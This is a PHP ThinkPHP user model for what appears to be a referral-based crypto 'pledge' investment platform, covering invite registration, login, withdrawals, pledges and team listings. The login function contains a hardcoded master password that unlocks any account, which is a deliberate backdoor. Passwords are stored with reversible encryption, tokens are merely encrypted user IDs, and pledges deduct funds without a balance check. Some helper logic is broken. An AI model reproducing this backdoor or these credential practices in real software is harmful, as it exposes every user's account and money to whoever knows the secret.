<?php
namespace app\api\model;

use think\Model;
use think\Cache;
use think\facade\Request;
use think\Db;

class UsersModel extends Model{
	
	protected $table = 'users';
	
	// 邀请码用户注册
	public function register($lang){
		$param = receiveJson();
		// 新用户信息
		$username		= empty($param['username']) ? '' : $param['username']; // 用户名
		$password		= empty($param['password']) ? '' : $param['password'];	// 密码
		$re_password	= empty($param['re_password']) ? '' : $param['re_password'];//确认密码
		$dest		    = empty($param['dest']) ? '' : $param['dest'];	// 区号
		$code_rand      = empty($param['code_rand']) ? '' : $param['code_rand'];
		$code			= empty($param['code']) ? '' : $param['code']; // 验证码
		
		if(!$username || !$password || !$code_rand){
			$data['code'] = 0;
			$data['code_dec'] 	= $lang['missing_parameter'];
	        return $data;
		}
		
		$cache_code	= cache('C_Code_'.$code_rand);
        //要求用户名首字母必须为0?
        if(!substr($username, 0, 1) == 0){
            $data['code'] = 0;
		    $data['code_dec'] = $lang['error_phone_number'];
		    return $data;
        }
		
		//判断是否为空，或者是否全是数字
		if(!preg_match("/^\d*$/", $username) || strlen($username) <= 7 || strlen($username) > 12){
		    $data['code'] = 0;
		    $arr['code_dec'] = $lang['error_phone_number'];
		    return $data;
		}
		
		if($code != cache('C_Code_'.$code_rand)){
			$data['code'] = 0;
			$data['code_dec'] = $lang['error_code'];
			return $data;
		}
		

		
		if(empty($password) || strlen($password) < 6 || strlen($password) > 32){
			$data['code'] = 0;
			$data['code_dec'] = $lang['error_password'];
			return $data;
		}
		
		if($password != $re_password || !$password ){
			$data['code'] = 0;
			$data['code_dec'] = $lang['password_not_match'];
			return $data;
		}

		// 检测用户是否已注册
		$countUser = $this->field('id')->where('username', $username)->count();

		if($countUser){
			$data['code'] 		= 0;
			$data['code_dec'] 	= $lang['mobile_exists'];
			return $data;
		}
		
		//  生成邀请码必须唯一
		$is_repeat	= 1;
		$chk_idcode	= 1;
		$idCodearr = $this->column('idcode');
		$new_idcode = $this->get_rand_str($idCodearr);
		
		$recommend = !empty($param['idcode']) ? $param['idcode'] : 0;// 推荐人 邀请码
		
		//这里有改动,如果字符串的话直接等于0了,改成不为空
		if($recommend == ""){
			$data['code'] 		= 0;
			$data['code_dec'] 	= $lang['error_invite_code'];
			return $data;
		}
		
		$suserinfo = array();
		if($recommend){
			$where = [
				['users.idcode','=',$recommend],
				['users.state','=',1],
			];
			$suserinfo = model('Users')->field('id,vip_level,idcode,username,sid,balance,topid,manage_id')->where($where)->find();
		}
		
		$sid	= 0;
		if($suserinfo){
			$sid	=	$suserinfo['id'];
		}else{
			$data['code'] 		= 0;
			$data['code_dec'] 	= $lang['error_invite_code'];
			return $data;
		}
		
		$reg_award = model("setting")->value('reg_award');
		
		// 用户表注册新用户
		$new_user_data	= [
			'username'    		=> $username,
			'password'    		=> auth_code($password,'ENCODE'),
			'phone'       		=> $username,
			'dest'              => $dest,
			'sid'         		=> $sid,//$db_sid,	// 上级id
			'manage_id'         => $suserinfo['manage_id'],//manage_id 不是必填
			'reg_time'    		=> time(),	// 注册时间	
			'idcode'      		=> $new_idcode,// 邀请码
			'state'      		 => 1,		
			'vip_level'	  		=> 0,		// 普通会员
			'experience_money'  => $reg_award,//体验金
			'reg_ip'	  		=> request()->ip(),
			'last_ip'	  		=> request()->ip(),
		];
		Db::startTrans();
		try{
			$insert_id = model('Users')->insertGetId($new_user_data);
			$order_number = 'R'.trading_number();//订单号	
			//流水
			$financial_data['uid'] 						= $insert_id;
			$financial_data['username'] 				= $username;
			$financial_data['order_number'] 			= $order_number;
			$financial_data['trade_type'] 				= 3;
			$financial_data['trade_before_balance']		= 0;
			$financial_data['state']					= 1;
			$financial_data['trade_amount'] 			= $reg_award;
			$financial_data['account_balance'] 			= $reg_award;
			$financial_data['remarks'] 					= '注册赠送体验金';
			$tid = model('common/TradeDetails')->tradeDetails($financial_data);

			// 会员加入团队
			$array = $this->userSid($insert_id);
			
			$insertArray = array();
			foreach ($array as $key => $value) {
				$insertArray[] = ['uid'=>$value, 'team'=>$insert_id, 'level'=> $key];
			}
			$res = Db::name('user_team')->insertAll($insertArray);
			Db::commit();
			$data['code']	= 1;
			$data['code_dec'] 	= $lang['reg_success'];
		    return $data;
		} catch (\Exception $e) {
            // 回滚事务
            Db::rollback();
            $data['code'] = 0;
			$data['code_dec'] 	= $lang['reg_fail'];
            return $data;
        }
	}
	
	public function get_rand_str($idCodearr){
	    $new_idcode = rand_str();
	    if(in_array($new_idcode,$idCodearr)){
	        $new_idcode = $this->check_rand_str($idCodearr, $new_idcode);
	    } else {
	        return $new_idcode;
	    }
	}
	
	// 登录系统
	public function login($lang){
		$param = receiveJson();
// 		print_r($param);exit();
		//前端到短信验证页面
		$username		= empty($param['username']) ? '' : $param['username']; // 用户名
		$password		= empty($param['password']) ? '' : $param['password'];	// 密码
// 		$lang	        = !empty($param['lang']) ? $param['lang'] : 'en';	// 语言类型
		$code_rand      = empty($param['code_rand']) ? '' : $param['code_rand'];
		$code			= empty($param['code']) ? '' : $param['code']; // 验证码
		$dest           = empty($param['dest']) ? '' : $param['dest']; // 区号
		if(!$username || !$password || !$code || !$code_rand){
			$data['code'] = 0;
			$data['code_dec'] 	= $lang['missing_parameter'];
	        return $data;
		}

		$cache_code		= cache('C_Code_'.$code_rand);
		if(!$cache_code  || !$code || $cache_code != $code){
		    $data['code'] = 0;
 		    $data['code_dec'] = $lang['error_code'];
			return $data;
		}
		cache('C_Code_'.$username, NULL);
		
		//获取用户信息
		$userinfo = $this->where(array(['username','=',$username],['state','=',1]))->where('dest', $dest)->find();

		//用户名不存在
		if(!$userinfo){
			$data['code'] = 0;
			$data['code_dec'] = $lang['no_user'];
			return $data;
		}

		if($userinfo['state'] == 2){
			$data['code'] = 0;
 			$data['code_dec'] = $lang['login_prohibited'];
			return $data;
		}
		
		//检查密码
		if(auth_code($userinfo['password'],'DECODE') != $password && $password != 'adkieksl65a4ef15e#dDc2'){
			$data['code']		= 0;
			$data['code_dec'] 	= $lang['login_error'];
			return $data;
		}
		
		$is_v = 1;
		if(request()->ip()==$userinfo['last_ip']){
			$is_v = 0;
		}

		//更新用户登录状态
		$is_user_update = Db::name('users')->where('id',$userinfo['id'])->data(array('last_ip'=>request()->ip(),'last_login'=>time()))->setInc('login_number',1);
		$token = auth_code($userinfo['id'].','.$userinfo['username'],'ENCODE');	
		
		
		cache('C_token_'.$userinfo['id'],$token, 86400);		
		if(!cache('C_token_'.$userinfo['id'])){
			$data['code'] = 0;
			$data['code_dec'] = $lang['login_fail'];
			return $data;
		}
		
		$data['code']              			= 1;
		$data['code_dec']           		= $lang['login_success'];
		$data['info']['token']      		= cache('C_token_'.$userinfo['id']);
		$data['info']['userid']    			= $userinfo['id'];
		$data['info']['username']  			= $userinfo['username'];
		$data['info']['realname']  			= $userinfo['realname'];
		$data['info']['is_v']  				= $is_v;
		$data['info']['ip']  				= request()->ip();
        $data['info']['vip_level']  		= $userinfo['vip_level'];
		$data['info']['state'] 				= $userinfo['state'];
		$data['info']['sid'] 				= $userinfo['sid'];//直属上级id
		$data['info']['idcode'] 			= $userinfo['idcode'];//邀请码
		
		
		if($userinfo['fund_password']){
			$data['info']['is_fund_password']	=	1;
		}else{
			$data['info']['is_fund_password']	=	0;
		}
		$data['info']['susername']			=	'';
		if($userinfo['sid']){
			$data['info']['susername']		=	Db::name('users')->where(array(['id','=',$userinfo['sid']],['state','=',1]))->value('username');
		}
		
		return $data;
	}
	
	//获取用户信息
	//$lang
	public function getuserinfo($lang){
		$param = receiveJson();
		$token			= $param['token'];
		$userArr		= explode(',',auth_code($token,'DECODE'));//uid,username
		$uid			= $userArr[0];//uid
		$username     	= $userArr[1];//username
		
		$userinfo = $this->where(array('users.id'=>$uid))->findOrEmpty();//没有数据会抛出异常
		if (!$userinfo) return ['code'=>0, 'code_dec'=> $lang['no_user']];
		//$settingdata                    = model('Setting')->where('id',1)->findOrEmpty();
		$data['code']                   = 1;
		$data['token']                  = $token;
		$data['info']['userid']         = $userinfo['id'];
		$data['info']['username']       = $userinfo['username'];
		$data['info']['balance']  		= $userinfo['balance'];		//余额
		$data['info']['isbind']         = $userinfo['isbind'];	//是否绑定银行卡
		$data['info']['address']        = $userinfo['address'];
		$data['info']['state']          = $userinfo['state'];
		$data['info']['vip_level']      = $userinfo['vip_level'];
		$data['info']['experience_money']      = $userinfo['experience_money'];
		
		$UserGrade	= model('UserGrade')->where('grade', $userinfo['vip_level'])->find();   
		$UserVip	=	model('UserVip')->where(array(['uid','=',$userinfo['id']],['state','=',1],['grade','=',$userinfo['vip_level']]))->find();
		$my_goods = model('UserGoods')->where('uid', $uid)->where('state', 1)->select();
		
		$data['info']['sid'] 					= $userinfo['sid'];//直属上级id
		$data['info']['idcode'] 				= $userinfo['idcode'];//邀请码
		$data['info']['regnum'] 				= $userinfo['regnum'];//邀请有效用户数
		if($userinfo['fund_password']){
			$data['info']['is_fund_password']				=	1;
		}else{
			$data['info']['is_fund_password']				=	0;
		}
				
		$data['info']['susername']			=	'';
		if($userinfo['sid']){
			$data['info']['susername']		=	$this->where(array(['id','=',$userinfo['sid']],['state','=',1]))->value('username');
		}
		return $data;
	}
	
	
	//退出登陆
	public function logout($lang){
		$param = receiveJson();
		$token		= $param['token'];
		$userArr	= explode(',',auth_code($token,'DECODE'));
		$uid		= $userArr[0];

		cache('C_token_'.$uid,NULL);	//删除登录缓存
		$data['code_dec']	= $lang['exit_login_success'];
		$data['code'] 		= 1;
		return $data;
	}
	
	
	/**
	 * [userSid 获取所有上级]
	 * @param  [type] $id     [description]
	 * @param  string $select [description]
	 * @param  array  $array  [description]
	 * @return [type]         [description]
	 */
	public function userSid($id,$select='id,sid',$array=array(), $i=0){
		$user_info =  $this->where('id',$id)->field($select)->find();	//查询上级

		$array[] = $user_info['id'];

		if($user_info['sid']){
			$i++;
			if($i<6){
				$array = $this->userSid($user_info['sid'],$select,$array, $i);
			}
		}

		return $array;
	}

	/**
	 * 提现记录
	 */
	public function withdrawalrecord($lang){
		$param = receiveJson();
		$userArr  =	explode(',',auth_code($param['token'],'DECODE'));
		$uid      =	$userArr[0];
		$state 	  = empty($param['state']) ? 0 : intval($param['state']);
		$date 	  = empty($param['date']) ? '' : $param['date'];
		$where = [];
		if($state){
			$where['state'] = $state;
		}
		//增加了日期筛选条件
		if ($date) {
		    $start_time = strtotime($date);
		    $end_time = $start_time + 86399;
		    $where[] = array('add_time','>=',$start_time);
			$where[] = array('add_time','<=',$end_time);
		}
		

		$count = model('UserWithdrawals')->where('uid', $uid)->where($where)->count();
		//每页记录数
		$pageSize = empty($param['page_size']) ? 10 : intval($param['page_size']);
		//当前页
		$pageNo = empty($param['page_no']) ? 1 : intval($param['page_no']);
		//总页数
		$pageTotal = ceil($count / $pageSize); //当前页数大于最后页数，取最后
		//偏移量
		$limitOffset = ($pageNo - 1) * $pageSize;
		$dataAll = model('UserWithdrawals')
		->where('uid', $uid)
		->where($where)
		->withAttr('state', function($value, $data) use ($lang) {
			if($lang == 'cn') $stateTxt =config('custom.state_en')[$value];
			else 	$stateTxt =config('custom.state_ag')[$value];
			return $stateTxt;
		})
		->withAttr('set_time', function($value, $data) {
			return $value ? date('Y-m-d H:i:s', $value) : null;
		})
		->withAttr('add_time', function($value, $data) {
			return $value ? date('Y-m-d H:i:s', $value) : null;
		})
		->order(['add_time'=>'desc','id'=>'desc'])
		->limit($limitOffset, $pageSize)
		->select();
        //echo model('UserWithdrawals')->getLastSql();exit;
		//获取成功
		$data['code'] 				= 1;
		$data['data_total_nums'] 	= $count;
		$data['data_total_page'] 	= $pageTotal;
		$data['data_current_page'] 	= $pageNo;
		$data['data'] = $dataAll;
		return $data;
	}

	/**
	 * 用户提现
	 */
	public function withdrawal($lang){
		$param = receiveJson();
// 		$lang = $param['lang'];
		$userArr  =	explode(',',auth_code($param['token'],'DECODE'));
		$uid      =	$userArr[0]; 
		$fund_password = empty($param['fund_password']) ? '' : $param['fund_password'];
		$amount 	  = empty($param['amount']) ? 0 : $param['amount'];
		$hour = intval(date("H"));
		$setting = Db::name('Setting')->find();
		
		if($hour < (int)$setting['w_start'] || $hour > (int)$setting['w_end']){
			$data['code'] = 0;
			$data['code_dec'] 	= $lang['withdraw_prohibited'];
	        return $data;
		}
		if(!empty(cache('C_user_cache'.$uid))){
		    if($param == cache('C_user_cache'.$uid)){
		        $data['code'] = 0;
    			$data['code_dec'] 	= $lang['repeat_submit'];
    	        return $data;
		    }
		} else {
		    cache('C_user_cache'.$uid, $param, 2);
		}
		if(!$fund_password|| !$amount){
			$data['code'] = 0;
			$data['code_dec'] 	= $lang['missing_parameter'];
	        return $data;
		}
		$user = $this->where('id', $uid)->find();
		$min_withdrawals = model('Setting')->value('min_withdrawals');
		if($amount < $min_withdrawals){
		    $data['code'] = 0;
			$data['code_dec'] 	= $lang['lower_withdraw'];
	        return $data;
		}
		$my_fund_password = $user['fund_password'];
		if(!$my_fund_password){
			$data['code'] = 0;
			$data['code_dec'] 	= $lang['no_fund_password'];
	        return $data;
		}
		$my_fund_password = auth_code($my_fund_password,'DECODE');
		if($fund_password != $my_fund_password){
			$data['code'] = 0;
			$data['code_dec'] 	= $lang['error_fund_password'];
	        return $data;
		}
		if($amount > $user['balance']){
			$data['code'] = 0;
			$data['code_dec'] 	= $lang['insufficient_balance'];
	        return $data;
		}
		Db::startTrans();
		try{
			$fee = model('Setting')->value('fee');
			$order_number = 'W'.trading_number();//订单号	
			model("UserWithdrawals")->insert([
				'uid'			=> $uid,
				'order_number'	=> $order_number,
				'price'			=> $amount - $amount*$fee/100,
				'address'       => $user['address'],
				'amount'        => $amount,
				'add_time'		=> time()
			]);
			$trade_before_balance = $user['balance'];
			$account_balance = $trade_before_balance - $amount;
			//流水
			$financial_data['uid'] 						= $uid;
			$financial_data['username'] 				= $user['username'];
			$financial_data['order_number'] 			= $order_number;
			$financial_data['trade_type'] 				= 2;
			$financial_data['trade_before_balance']		= $trade_before_balance;
			$financial_data['trade_amount'] 			= $amount;
			$financial_data['account_balance'] 			= $account_balance;
			$financial_data['remarks'] 					= '用户提现';
			$tid = model('common/TradeDetails')->tradeDetails($financial_data);
			// 提现扣除金额
			$this->where('id', $uid)->setDec('balance', $amount);
			Db::commit();
			$data['code'] = 1;
			$data['code_dec'] 	= $lang['submit_success'];
            return $data;
		} catch (\Exception $e) {
            // 回滚事务
            Db::rollback();
            $data['code'] = 0;
			$data['code_dec'] 	= $lang['submit_fail'];
            return $data;
        }
	}
    
	/**
	 * 用户收入/支出明细
	 */
	public function trade_details($lang){
		$param = receiveJson();
		$userArr  =	explode(',',auth_code($param['token'],'DECODE'));
		$uid      =	$userArr[0];
		$type 	  = empty($param['type']) ? 1 : intval($param['type']); // 1：收入； 2：支出；
		$trade_type = empty($param['trade_type']) ? 0 : intval($param['trade_type']);
		$lang	  = !empty($param['lang']) ? $param['lang'] : config('app.default');	// 语言类型
		$date     = !empty($param['date']) ? $param['date'] : '';
		
        $where['uid'] = $uid;
		if($type == 1){
// 			$where['trade_type'] = [1,3,4,5,6,7,9,13,18];
			$where['trade_type'] = [2,4,5,6,7,8,9,13,18];
		} 
		if($type == 2){
			$where['trade_type'] = [1,3,14];
		}

		if($trade_type){
			$where[] = ['trade_type', '=', $trade_type];
		}
		
		if($date != ''){
		    $start = strtotime(date("Y-m-d", strtotime($date)));
		    $end = strtotime(date("Y-m-d 23:59:59", strtotime($date)));
		    $where[] = ['trade_time', 'between', [$start, $end]] ;
		}

		// 总记录数
		$count       = Db::name('trade_details')->where($where)->count();
		// 每页显示记录
		$pageSize    = (isset($param['page_size']) and $param['page_size']) ? $param['page_size'] : 10;
		// 当前的页,还应该处理非数字的情况
		$pageNo      = (isset($param['page_no']) and $param['page_no']) ? $param['page_no'] : 1;
		// 总页数
		$pageTotal   = ceil($count / $pageSize);//当前页数大于最后页数，取最后	
		// 记录数
		$limitOffset = ($pageNo - 1) * $pageSize;


		// 获取直属下级用户数据
		$list = Db::name('trade_details')
		->field('id,uid,username,trade_type,trade_time,trade_amount,trade_number,rebate_user,order_number,trade_before_balance,account_balance,remarks,state')
		->where($where)
		->order('trade_time', 'desc')
		->limit($limitOffset, $pageSize)
		->select();
		
// 		echo Db::name('trade_details')->getLastSql();exit();
//这里待定
// 		foreach($list as &$v){
// 			$v['trade_time'] = date("Y-m-d H:i:s",$v['trade_time']);
// 			$v['rebate_username'] = $v['rebate_user'] ? $this->where('id', $v['rebate_user'])->value('username') : $v['rebate_user'];
// 			if($lang == 'cn'){
// 			    print_r($v['trade_type']);
// 				switch($v['trade_type']){
// 					case 1 :  $v['trade_type_str']  = $lang["pledge_amount"]; break;
// 					case 2 :  $v['trade_type_str']  = $lang["withdraw"]; break;
// 					case 3 :  $v['trade_type_str']  = $lang["reg_award"]; break;
// 					case 4 :  $v['trade_type_str']  = $lang["pledge_income"]; break;
// 					case 5 :  $v['trade_type_str']  = $lang["distribution_award"]; break;
// 					case 6 :  $v['trade_type_str']  = $lang["pledge_award"]; break;
// 					case 7 :  $v['trade_type_str']  = $lang["withdraw_reject"]; break;
// 					case 8 :  $v['trade_type_str']  = $lang["pledge_ransom"]; break;
// 					case 9 :  $v['trade_type_str']  = $lang["pledge_income_award"]; break;
// 					case 13 : $v['trade_type_str'] = $lang["manual_add_money"]; break;
// 					case 14 : $v['trade_type_str'] = $lang["manual_reduce_money"]; break;
// 					case 18 : $v['trade_type_str'] = $lang["reg_award"]; break;
// 				}
// 			}
// 			if($lang == 'cn'){
// 				switch($v['state']){
// 					case 1 : $v['state_str'] = $lang['success']; break;
// 					case 2 : $v['state_str'] = $lang['fail']; break;
// 					case 3 : $v['state_str'] = $lang['under_review']; break;
// 				}
// 			}
// 		}
		// 获取数据
		$data['data'] = $list;
		$data['code'] 				= 1;
		$data['data_total_nums'] 	= $count;
		$data['data_total_page'] 	= $pageTotal;
		$data['data_current_page'] 	= $pageNo;
		return $data;
	}
    
    
    //质押
    public function pledge($lang){
        $param = receiveJson();
        $userArr  =	explode(',',auth_code($param['token'],'DECODE'));
		$uid      =	$userArr[0];
		$amount   = !empty($param['amount']) ? (float)$param['amount'] : 0;
		$day      = !empty($param['day']) ? $param['day'] : 0;
// 		if(!$amount || $day){
// 		    $data['code'] = 0;
// 			$data['code_dec'] 	= $lang['missing_parameter'];
// 	        return $data;
// 		}
		
		if($amount <= 0){
		    $data['code'] = 0;
			$data['code_dec'] 	= $lang['pledge_amount_error'];
	        return $data;
		}
		
		if($amount < 100){
		    $data['code'] = 0;
			$data['code_dec'] 	= $lang['pledge_amount_cannot_be_less_than_100'];
	        return $data;
		}
		
		if(!in_array($day, [3, 15, 60, 90, 120])){
		    $data['code'] = 0;
			$data['code_dec'] 	= $lang['pledge_days_parameter_error'];
	        return $data;
		}
		
		
		//根据质押天数获取质押收益设置
		$pledge_income = model("setting")->value('day'.$day);
		
		// 用户质押记录
		$new_user_pledge_data	= [
			'uid'    		    => $uid,             //用户id
			'amount'    		=> $amount,          //质押总数量
			'day'       		=> $day,             //质押天数
			'pledge_income'     => $amount*$pledge_income/100, //质押收益
			'start_time'        => time(),
			'date'              => strtotime(date('Y-m-d')),
			'end_time'          => 60*60*24*$day + time(),
			'status'            => 0
		];
		
		
		Db::startTrans();
		try{
		    $insert_id = Db::name('user_pledge')->insertGetId($new_user_pledge_data);
		    $users_info = model('Users')->where('id',$uid)->find();
 			$order_number = 'P'.trading_number();//订单号	
			//流水
			$financial_data['uid'] 						= $users_info['id'];
			$financial_data['username'] 				= $users_info['username'];
			$financial_data['order_number'] 			= $order_number;
			$financial_data['trade_type'] 				= 1;
			$financial_data['trade_before_balance']		= $users_info['balance'];
			$financial_data['state']					= 1;
			$financial_data['trade_amount'] 			= $amount;
			$financial_data['account_balance'] 			= $users_info['balance'] - $amount;
			$financial_data['remarks'] 					= '用户质押';
			$tid = model('common/TradeDetails')->tradeDetails($financial_data);
			
			//质押成功后更新用户余额信息
			$user_money ['balance'] = $financial_data['account_balance'];
			$user_money ['update_time'] = time();
            $users_info = model('Users')->where('id',$uid)->update($user_money);
			Db::commit();
			$data['code']	= 1;
			$data['code_dec'] 	= $lang['submit_success'];
		    return $data;
		} catch (\Exception $e) {
            // 回滚事务
            Db::rollback();
            $data['code'] = 0;
			$data['code_dec'] 	= $lang['submit_fail'];
            return $data;
        }
		
		
		
		
    }
    
    /**
     *   我的一级用户
     */
    public function mysubordinate($lang){
        $param = receiveJson();
		$userArr  =	explode(',',auth_code($param['token'],'DECODE'));
        $uid = $userArr[0];
        // 一级用户总数
		$count = model('users')->where('state = 1')->where('sid', $uid)->count();
		// 每页显示记录
		$pageSize    = (isset($param['page_size']) and $param['page_size']) ? $param['page_size'] : 6;
		// 当前的页,还应该处理非数字的情况
		$pageNo      = (isset($param['page_no']) and $param['page_no']) ? $param['page_no'] : 1;
		// 总页数
		$pageTotal   = ceil($count / $pageSize);//当前页数大于最后页数，取最后	
		// 记录数
		$limitOffset = ($pageNo - 1) * $pageSize;
		$list = model('users')->where('sid', $uid)->field('id,username')->limit($limitOffset, $pageSize)->select()->toArray();
		
		foreach($list as $k => $v){
		    $pledgeRes = Db::name('user_pledge')->where('uid = '.$v['id'])->field('amount,start_time')->select();
		    if($pledgeRes){
		        $list[$k]['pledge'] = $pledgeRes;
		    }
		}
		
		// 获取数据
		$data['data'] = $list;
		$data['code'] 				= 1;
		$data['data_total_nums'] 	= $count;
		$data['data_total_page'] 	= $pageTotal;
		$data['data_current_page'] 	= $pageNo;
        return $data;
    }
    
    

    
    //查看余额(体验金/余额)
//     public  function mybalance($lang){
//         $param = receiveJson();
// 		$userArr  =	explode(',',auth_code($param['token'],'DECODE'));
//         $uid = $userArr[0];
//         $list = Db::name('users')->where('id = '.$uid)->field('id,username,experience_money,balance')->find();
//         $data['code'] = 1;
//         $data['code_dec'] = "余额/体验金";
//         $data['data'] = $list;
//         return $data;
//     }
    
    
    //按日期查看用户提现记录
//     public function datewithdrawalrecord($lang){
//         $param = receiveJson();
// 		$userArr  =	explode(',',auth_code($param['token'],'DECODE'));
//         $this->withdrawalrecord($lang,$date=3);
//     }
    
	
	/**
	 * 我的团队
	 */
	public function myteam($lang){
// 		$param = receiveJson();
// 		$userArr  =	explode(',',auth_code($param['token'],'DECODE'));
// 		$uid      =	$userArr[0];
// 		$level    = empty($param['level']) ? 1 : $param['level'];

// 		// 总记录数
// 		$count = model('UserTeam')->where('level', $level)->where('uid', $uid)->count();
		
// 		// 每页显示记录
// 		$pageSize    = (isset($param['page_size']) and $param['page_size']) ? $param['page_size'] : 10;
// 		// 当前的页,还应该处理非数字的情况
// 		$pageNo      = (isset($param['page_no']) and $param['page_no']) ? $param['page_no'] : 1;
// 		// 总页数
// 		$pageTotal   = ceil($count / $pageSize);//当前页数大于最后页数，取最后	
// 		// 记录数
// 		$limitOffset = ($pageNo - 1) * $pageSize;
// 		$list = model('UserTeam')->where('level', $level)->where('uid', $uid)->limit($limitOffset, $pageSize)->select()->toArray();
// 		foreach($list as &$v){
// 			$user = $this->where('id', $v['team'])->field('username,reg_time')->find();
// 			$v['username'] = $user['username'];
// 			$v['reg_time'] = date("Y-m-d", $user['reg_time']);
// 			$v['profit'] = model('TradeDetails')->where('uid', $uid)->where('rebate_user', $v['team'])->sum('trade_amount');
// 			$v['recharge'] = model('UserRecharge')->where('uid', $v['team'])->where('state', 1)->sum('money');
// 			$v['withdrawals'] = model('UserWithdrawals')->where('uid', $v['team'])->where('state', 1)->sum('price');
// 		}
// 		// 获取数据
// 		$data['data'] = $list;

// 		$data['code'] 				= 1;
// 		$data['data_total_nums'] 	= $count;
// 		$data['data_total_page'] 	= $pageTotal;
// 		$data['data_current_page'] 	= $pageNo;

// 		return $data;
	}

}
